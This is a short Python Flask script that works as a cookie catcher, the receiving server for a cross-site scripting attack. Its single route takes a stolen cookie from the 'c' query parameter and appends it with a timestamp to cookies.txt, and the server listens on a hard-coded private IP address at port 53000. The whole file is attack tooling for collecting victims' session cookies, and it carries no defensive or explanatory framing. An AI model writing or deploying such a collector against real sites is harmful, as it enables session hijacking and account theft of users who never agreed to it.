from flask import Flask, request, redirect
from datetime import datetime

app = Flask(__name__)

@app.route('/')
def cookie():
	cookie = request.args.get('c')
	f = open("cookies.txt", "a")
	f.write(cookie + '' + str(datetime.now()) + '\n')

if __name__ == "__main__":
	app.run('10.8.107.21', port=53000)